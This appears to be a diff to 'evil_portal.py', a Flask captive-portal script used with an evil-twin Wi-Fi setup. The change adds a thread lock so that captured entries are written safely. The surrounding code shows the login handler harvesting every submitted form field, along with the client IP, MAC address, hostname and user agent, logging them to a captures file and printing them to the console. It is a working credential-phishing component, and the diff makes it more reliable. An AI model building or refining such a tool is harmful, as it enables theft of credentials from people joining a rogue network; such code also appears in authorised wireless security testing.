@@ -19,7 +19,7 @@ Runs on port 80 so it sits behind the iptables redirect from start-evil-twin.sh
     sudo ADMIN_TOKEN=letmein python3 evil_portal.py    # protect /admin?token=letmein
     sudo PORTAL_PORT=8080 python3 evil_portal.py        # test on a high port
 """
-import json, os, subprocess
+import json, os, subprocess, threading
 from datetime import datetime
 from flask import Flask, request, redirect, Response
 
@@ -30,6 +30,7 @@ ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")  # empty = no auth (LAN demo)
 PORT = int(os.environ.get("PORTAL_PORT", "80"))
 
 app = Flask(__name__)
+_capture_lock = threading.Lock()   # serialize appends; Flask runs threaded=True
 
 
 # ---------------- device lookup ----------------
@@ -105,7 +106,7 @@ def login():
         "user_agent": request.headers.get("User-Agent", ""),
         "fields": {k: v for k, v in request.form.items()},
     }
-    with open(CAPTURES, "a") as f:
+    with _capture_lock, open(CAPTURES, "a") as f:
         f.write(json.dumps(entry) + "\n")
     print(f"[CAPTURE] {ip} {mac or '?'} {hostname or ''} -> {entry['fields']}",
           flush=True)
